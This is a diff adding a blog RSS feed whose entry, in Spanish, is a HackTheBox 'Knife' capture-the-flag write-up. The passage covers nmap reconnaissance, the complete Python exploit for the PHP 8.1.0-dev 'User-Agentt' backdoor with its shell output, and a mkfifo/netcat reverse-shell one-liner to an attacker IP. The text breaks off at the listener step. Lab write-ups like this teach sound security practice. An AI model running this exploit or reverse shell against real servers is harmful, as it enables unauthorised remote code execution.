@@ -1,0 +1,310 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>d4vlog</title>
+    <description>d4vlog page</description>
+    <link>http://localhost:8080</link>
+    <atom:link href="http://localhost:8080/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>d4vlog</name>
+      <email>xxxxxx@d4blog.com</email>
+      <uri>https://d4v0x.github.io/</uri>
+    </author>
+    
+      <item>
+        <title>HTB - Knife</title>
+        <description>&lt;p&gt;&lt;img src=&quot;assets/knife.jpeg&quot; alt=&quot;Knife&quot; /&gt;&lt;!--{:width=&quot;800px&quot; width=&quot;1000px&quot;}--&gt;
+&lt;a href=&quot;https://app.hackthebox.eu/machines/Knife&quot;&gt;Sitio Oficial de la maquina&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Knife es una maquina retirada de HackTheBox&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeracion&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Enumeracion&lt;/h1&gt;
+&lt;p&gt;Lanzamos un nmap para descubrir los puertos abiertos&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; target 10.10.10.242
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Sep  9 12:01:55 2021 -- 1 IP address (1 host up) scanned in 26.67 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;comandos-utilizados&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Comandos utilizados&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sC:&lt;/code&gt; serie basicos de scripts&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sV:&lt;/code&gt; para detectar el servicio/version del puerto&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS:&lt;/code&gt; TCP SYNK port scan, se envían solo paquetes de tipo SYN (inicio de conexión) y mediante el tipo de respuesta RST/ACK (no existe)o SYN/ACK (si existe) determina si esta corriendo algún servicio en el puerto&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p- --open:&lt;/code&gt; para que reporte los puertos con estado abierto&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate 500:&lt;/code&gt; para que envie paquetes N paquetes por segundo, esto hace mas rapido el escaneo&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn:&lt;/code&gt; indicamos que no realice reconocimiento de host&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oA:&lt;/code&gt; exportamos la informacion en todos los formatos, en caso que quieras hacer un reporte mas detallado&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Tenemos dos puertos 22 y 80, antes de ir directamente al sitio a investigar vamos a lanzar un whatweb para ver a que nos enfrentamos&lt;/p&gt;
+
+&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;whatweb&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Country&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RESERVED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTML5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;HTTPServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)],&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Emergent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Medical&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Idea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Powered&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Informacion relevante &lt;span style=&quot;color:yellow&quot;&gt;&lt;strong&gt;Apache[2.4.41]&lt;/strong&gt; &lt;strong&gt;PHP[8.1.0-dev]&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Agregamos la direccion del equipo al &lt;span style=&quot;color:green&quot;&gt;/etc/hosts&lt;/span&gt; esto realmente no siempre es necesario pero en mi experiencia es recomendable para no omitir nada del sitio. Con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo vim /etc/hosts&lt;/code&gt; agregamos la linea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.242 knife.htb&lt;/code&gt; quedando el archivo de la siguiente manera&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Host addresses&lt;/span&gt;
+127.0.0.1  localhost
+10.10.10.242 knife.htb
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ingresamos al sitio para ver de que se trata&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/knife_site.jpg&quot; alt=&quot;Web-Site&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Despues de varias vueltas por el sitio, revisando el codigo fuente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + u&lt;/code&gt; mirando los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.js&lt;/code&gt; no encontre nada util&lt;/p&gt;
+
+&lt;h1 id=&quot;explotacion&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Explotacion&lt;/h1&gt;
+
+&lt;p&gt;Volviendo a lo que habiamos encontrado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; vamos a buscar algun exploit para &lt;span style=&quot;color:yellow&quot;&gt;&lt;strong&gt;PHP [8.1.0-dev]&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/PHP_8.1.0-dev.jpg&quot; alt=&quot;PHP_8.1.0-dev&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ingresamos al primer enlace y leemos el exploit para entender como utilizarlo, bueno eso seria lo idea ya que estamos aprendiendo, peeero tambien podemos descargarlo darle privilegios de ejecucion y utilizarlo directamente xD&lt;/p&gt;
+
+&lt;p&gt;Obtenemos el exploit 49933.py&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
+# Date: 23 may 2021
+# Exploit Author: flast101
+# Vendor Homepage: https://www.php.net/
+# Software Link: 
+#     - https://hub.docker.com/r/phpdaily/php
+#    - https://github.com/phpdaily/php
+# Version: 8.1.0-dev
+# Tested on: Ubuntu 20.04
+# References:
+#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
+&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
+Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
+Contact: flast101.sec@gmail.com
+
+An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, 
+but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an 
+attacker can execute arbitrary code by sending the User-Agentt header.
+The following exploit uses the backdoor to provide a pseudo shell ont the host.
+&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the full host url:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;lt;Response [200]&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Interactive shell is opened on&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Can't acces tty; job crontol turned off.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&quot;User-Agentt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;zerodiumsystem('&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;');&quot;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;current_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;!DOCTYPE html&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exiting...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host is not available, aborting...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez que entendemos como funciona el script es hora de utilizarlo, damos permiso de ejecucion al archivo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x 49933.py&lt;/code&gt; y ejecutamos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 49933.py                  
+Enter the full host url:
+http://knife.htb/
+
+Interactive shell is opened on http://knife.htb/ 
+Can&lt;span class=&quot;s1&quot;&gt;'t acces tty; job crontol turned off.
+$ whoami
+james
+
+$ ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var 
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/tenor.gif&quot; alt=&quot;YEES!&quot; width=&quot;60px&quot; /&gt; Obtenemos acceso al equipo!!&lt;/p&gt;
+
+&lt;p&gt;Ya que podemos ejecutar comandos desde la terminar, para que sea mas comodo a la hora de explorar los ficheros vamos a entablarnos una reverse shell y hacer un tratamiento de la &lt;span style=&quot;color:red&quot;&gt;tty&lt;/span&gt; para obtener una terminal interactiva y poder utilizar los comados &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + c&lt;/code&gt; y el autocompletado(&lt;span style=&quot;color:red&quot;&gt;!!&lt;/span&gt;).&lt;/p&gt;
+
+&lt;h4 id=&quot;reverse-shell&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Reverse Shell&lt;/h4&gt;
+
+&lt;p&gt;En la sesion que ganamos acceso a la maquina ejecutamos&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.15.25 4242 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Adecuamos el comando ingresando la direccion de nuestra maquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.15.25&lt;/code&gt; y el puerto de escucha &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4242&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;En otra ventana en nuestra maquina de atacante vamos a ponernos en escucha en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4242&lt;/code&gt;&lt;/p&gt;
+
